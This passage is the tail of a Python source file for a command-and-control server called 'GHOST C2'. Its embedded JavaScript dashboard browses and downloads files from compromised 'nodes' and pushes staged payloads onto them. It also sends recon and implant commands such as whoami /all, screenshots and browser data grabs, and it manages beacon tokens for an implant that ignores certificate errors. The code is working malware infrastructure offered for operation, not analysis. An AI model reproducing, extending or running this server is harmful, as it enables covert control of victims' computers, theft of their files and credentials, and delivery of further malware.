    if(!p)return'';
    const t=p.replace(/\\+$/,'');
    const i=t.lastIndexOf('\\');
    return i<3?'':t.slice(0,i+1);
  }
  function fmtSize(n){if(n<1024)return n+' B';if(n<1048576)return(n/1024).toFixed(1)+' KB';
    if(n<1073741824)return(n/1048576).toFixed(1)+' MB';return(n/1073741824).toFixed(2)+' GB';}
  async function openFiles(path){
    if(!selectedSid)return toast('No node selected','err');
    path=(path||'').trim();
    switchTab('files');
    filesCwd=path;
    $('files-path').value=path;
    $('files-list').innerHTML='<div class="files-empty">loading…</div>';
    // Baseline count of existing listings — count-based comparison is
    // timezone-safe (wall-clock diffs break when the server ts parses as local).
    let baseN=-1;
    { const r=await api('/results/'+encodeURIComponent(selectedSid));
      if(r){ const d=await r.json().catch(()=>null);
        baseN=((d&&d.results)||[]).filter(e=>e.output&&(e.output.startsWith('[FILES]')||e.output.startsWith('[DRIVES]'))).length; } }
    sendCmd(path?'!files '+path:'!files');
    for(let i=0;i<16;i++){
      await new Promise(r=>setTimeout(r,1200));
      const r=await api('/results/'+encodeURIComponent(selectedSid));if(!r)return;
      const d=await r.json().catch(()=>null);if(!d)continue;
      const ents=(d.results||[]).filter(e=>e.output&&(e.output.startsWith('[FILES]')||e.output.startsWith('[DRIVES]')));
      if(ents.length>baseN)return renderFiles(ents[ents.length-1].output);
    }
    $('files-list').innerHTML='<div class="files-empty">no listing received — is the node online?</div>';
  }
  function renderFiles(out){
    const isDrives=out.startsWith('[DRIVES]');
    let entries=[];
    try{
      const j=JSON.parse(out.slice(out.indexOf('\n')+1));
      entries=isDrives?j.map(d=>({n:d,d:1,s:0,m:0})):j;
    }catch(e){$('files-list').innerHTML='<div class="files-empty">bad listing</div>';return;}
    let html='';
    if(!isDrives&&filesCwd)
      html+=`<div class="frow"><span class="fi">&#8679;</span><span class="fn" onclick="openFiles(jsq(parentPath(filesCwd)))">..</span><span class="fs"></span><span class="fd"></span><span style="width:64px"></span></div>`;
    entries.forEach(e=>{
      const full=isDrives?e.n:(filesCwd.replace(/\\?$/,'\\')+e.n);
      const when=e.m?new Date(e.m*1000).toISOString().slice(0,16).replace('T',' '):'';
      html+=`<div class="frow"><span class="fi">${e.d?'&#128449;':'&#128196;'}</span>`+
        (e.d?`<span class="fn" onclick="openFiles(jsq('${jsq(full)}'))">${esc(e.n)}</span>`
            :`<span class="fn">${esc(e.n)}</span>`)+
        `<span class="fs">${e.d?'&lt;dir&gt;':fmtSize(e.s)}</span><span class="fd">${when}</span>`+
        (e.d?'':`<button class="fdl" onclick="dlFile(jsq('${jsq(full)}'))">GET</button>`)+
        `<span style="width:64px"></span></div>`;
    });
    $('files-list').innerHTML=html||'<div class="files-empty">empty directory</div>';
  }
  let dlWait=null;
  function dlFile(p){
    if(!selectedSid)return;
    const box=$('console');
    const ups=(box._entries||[]).filter(e=>e.output&&e.output.startsWith('[UPLOAD:'));
    dlWait={path:p,count:ups.length};
    sendCmd('upload '+p);
    toast('Requesting '+p.split('\\').pop()+'…','info');
  }
  async function pushStaged(){
    if(!plMeta)return toast('Stage a payload first (Payload tab)','warn');
    if(!filesCwd)return toast('Navigate into a folder first','warn');
    const dest=filesCwd.replace(/\\?$/,'\\')+plMeta.name;
    sendCmd('!getfile '+dest);
    toast('Pushing '+plMeta.name+' to target…','info');
  }
  window.openFiles=openFiles;window.dlFile=dlFile;window.pushStaged=pushStaged;
  window.jsq=jsq;window.parentPath=parentPath;

  /* ── command palette ──────────────────────────────────────────────── */
  let palItems=[],palIdx=0;
  function openPalette(){$('palette-ov').classList.add('show');$('pal-input').value='';palRender();$('pal-input').focus();}
  function closePalette(){$('palette-ov').classList.remove('show');}
  window.openPalette=openPalette;
  function palRender(){
    const q=($('pal-input').value||'').toLowerCase();
    palItems=[];
    const quick=['whoami /all','ipconfig /all','systeminfo','tasklist /v','!ps','netstat -ano','!screenshot','!browser','!getpid','!env'];
    const cmds=quick.filter(c=>c.toLowerCase().includes(q)).map(c=>({g:'Commands',label:c,sub:selectedSid?'send':'no node',run:()=>{closePalette();if(currentTab!=='console')switchTab('console');sendCmd(c);}}));
    const acts=[
      {g:'Actions',label:'Refresh sessions',run:()=>{closePalette();refreshSessions();}},
      {g:'Actions',label:'Clear console output',run:()=>{closePalette();clearResults();}},
      {g:'Actions',label:'Clear audit log',run:()=>{closePalette();clearAudit();}},
      {g:'Actions',label:'Sign out',run:()=>{closePalette();logout();}}
    ].filter(a=>a.label.toLowerCase().includes(q));
    const nodes=lastSessions.filter(s=>((s.recon?.hostname||'')+' '+s.session+' '+(s.recon?.user||'')+' '+s.remote_ip).toLowerCase().includes(q))
      .map(s=>({g:'Nodes',label:s.recon?.hostname||s.session.slice(0,24),sub:s.remote_ip,run:()=>{closePalette();selectSession(s.session);}}));
    palItems=[...acts,...cmds,...nodes];
    palIdx=0;
    const list=$('pal-list');
    if(!palItems.length){list.innerHTML='<div class="pal-empty">No matches</div>';return;}
    let html='',lastG='';
    palItems.forEach((it,i)=>{
      if(it.g!==lastG){html+='<div class="pal-group">'+it.g+'</div>';lastG=it.g;}
      html+='<div class="pal-item'+(i===palIdx?' active':'')+'" data-i="'+i+'" onclick="palClick('+i+')">'+
        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m9 18 6-6-6-6"/></svg>'+
        esc(it.label)+'<span class="pi-sub">'+esc(it.sub||'')+'</span></div>';
    });
    list.innerHTML=html;
  }
  function palHi(){document.querySelectorAll('.pal-item').forEach(el=>el.classList.toggle('active',Number(el.dataset.i)===palIdx));
    const act=document.querySelector('.pal-item.active');if(act)act.scrollIntoView({block:'nearest'});}
  function palKey(e){
    if(e.key==='Escape'){closePalette();return;}
    if(e.key==='ArrowDown'){e.preventDefault();if(palIdx<palItems.length-1){palIdx++;palHi();}}
    else if(e.key==='ArrowUp'){e.preventDefault();if(palIdx>0){palIdx--;palHi();}}
    else if(e.key==='Enter'){e.preventDefault();const it=palItems[palIdx];if(it)it.run();}
  }
  window.palKey=palKey;
  window.palRender=palRender;
  window.palClick=i=>{palIdx=i;const it=palItems[i];if(it)it.run();};

  document.addEventListener('keydown',e=>{
    if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='k'){e.preventDefault();
      $('palette-ov').classList.contains('show')?closePalette():openPalette();return;}
    if(e.key==='Escape'){closePalette();if($('modal-ov').classList.contains('show'))modalResolve(false);return;}
    if(e.key==='/'&&!['INPUT','TEXTAREA'].includes(document.activeElement?.tagName)&&selectedSid&&selectedStatus==='accepted'){
      e.preventDefault();$('cmd-input').focus();}
  });
  $('palette-ov').addEventListener('mousedown',e=>{if(e.target.id==='palette-ov')closePalette();});
  $('modal-ov').addEventListener('mousedown',e=>{if(e.target.id==='modal-ov')modalResolve(false);});

  /* ── boot ─────────────────────────────────────────────────────────── */
  tick();setInterval(tick,1000);
  setInterval(updateBeaconAge,1000);
  setInterval(updateCardIdles,1000);
  switchRail('activity');
  refreshSessions();fetchAudit();
  setInterval(()=>{if(document.hidden)return;refreshSessions();if(selectedSid)fetchResults();},5000);
  setInterval(()=>{if(!document.hidden)fetchAudit();},15000);
})();
</script></body></html>"""



@app.route("/", methods=["GET"])
def index():
    return Response(_LOGIN_HTML, mimetype="text/html",
                    headers={"Cache-Control": "no-store"})

@app.route("/dashboard", methods=["GET"])
def dashboard():
    return Response(_DASHBOARD_HTML, mimetype="text/html",
                    headers={"Cache-Control": "no-store"})

# ── Session janitor ───────────────────────────────────────────────────────────
def _janitor():
    while True:
        time.sleep(300)
        cutoff = time.time() - SESSION_TTL * 2
        with _lock:
            dead = [
                sid for sid, s in _sessions.items()
                if _iso_to_ts(s.get("last_beacon", "")) < cutoff
            ]
            for sid in dead:
                _sessions.pop(sid, None)
                _tasks.pop(sid, None)
                _results.pop(sid, None)

def _iso_to_ts(iso: str) -> float:
    try:
        return datetime.fromisoformat(iso.replace("Z", "+00:00")).timestamp()
    except Exception:
        return 0.0

# ── Console status printer ────────────────────────────────────────────────────
_RED    = "\033[91m"
_GREEN  = "\033[92m"
_YELLOW = "\033[93m"
_CYAN   = "\033[96m"
_GREY   = "\033[90m"
_BOLD   = "\033[1m"
_RESET  = "\033[0m"

def _status_printer():
    prev_count = -1
    while True:
        time.sleep(10)
        with _lock:
            count = len(_sessions)
            pending = sum(1 for s in _sessions.values() if s.get("status") == "pending")
        if count != prev_count:
            prev_count = count
            ts = datetime.now().strftime("%H:%M:%S")
            badge = f"{_GREEN}LIVE{_RESET}" if count else f"{_GREY}IDLE{_RESET}"
            pend  = f"  {_YELLOW}{pending} PENDING{_RESET}" if pending else ""
            print(f"  [{ts}] nodes={_BOLD}{count}{_RESET} {badge}{pend}")

# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(description="GHOST C2 Server")
    p.add_argument("--port",           type=int, default=8080,         help="listen port")
    p.add_argument("--host",           default="0.0.0.0",              help="bind address")
    p.add_argument("--beacon-token",   default=_CFG["beacon_token"],   help="implant beacon token (X-Beacon-Token)")
    p.add_argument("--operator-token", default=_CFG["operator_token"], help="operator token (X-Operator-Token)")
    p.add_argument("--user",           default=_CFG["dashboard_user"], help="dashboard username")
    p.add_argument("--password",       default=_CFG["dashboard_pass"], help="dashboard password")
    p.add_argument("--auto-accept",    action="store_true",            help="auto-accept all new sessions")
    p.add_argument("--tls",            action="store_true",
                   help="serve HTTPS with a self-signed cert (the implant ignores cert "
                        "errors; needs pyOpenSSL). Required for direct VPS hosting — "
                        "the implant always speaks HTTPS.")
    args = p.parse_args()

    _CFG["beacon_token"]   = args.beacon_token
    _CFG["operator_token"] = args.operator_token
    _CFG["dashboard_user"] = args.user
    _CFG["dashboard_pass"] = args.password
    _CFG["auto_accept"]    = args.auto_accept

    threading.Thread(target=_janitor,        daemon=True).start()
    threading.Thread(target=_status_printer, daemon=True).start()

    scheme = "https" if args.tls else "http"
    print(f"\n{_BOLD}{_CYAN}  GHOST C2 SERVER{_RESET}")
    print(f"  {'─'*40}")
    print(f"  Listen    : {_GREEN}{scheme}://{args.host}:{args.port}{_RESET}")
    print(f"  Dashboard : {_GREEN}{scheme}://localhost:{args.port}/{_RESET}")
    print(f"  Beacon tok: {_YELLOW}{args.beacon_token[:12]}...{_RESET}")
    print(f"  Op token  : {_YELLOW}{args.operator_token[:12]}...{_RESET}")
    if args.auto_accept:
        print(f"  Auto-accept: {_GREEN}ON{_RESET}")
    print(f"\n  {_GREY}Next step: point the implant's GetC2Host() at this host{_RESET}")
    print(f"  {'─'*40}\n")

    try:
        if args.tls:
            app.run(host=args.host, port=args.port, threaded=True, debug=False,
                    use_reloader=False, ssl_context="adhoc")
        else:
            app.run(host=args.host, port=args.port, threaded=True, debug=False,
                    use_reloader=False)
    except Exception as e:
        if args.tls:
            sys.exit(f"[!] --tls needs pyOpenSSL:  pip install pyOpenSSL   ({e})")
        raise

if __name__ == "__main__":
    main()
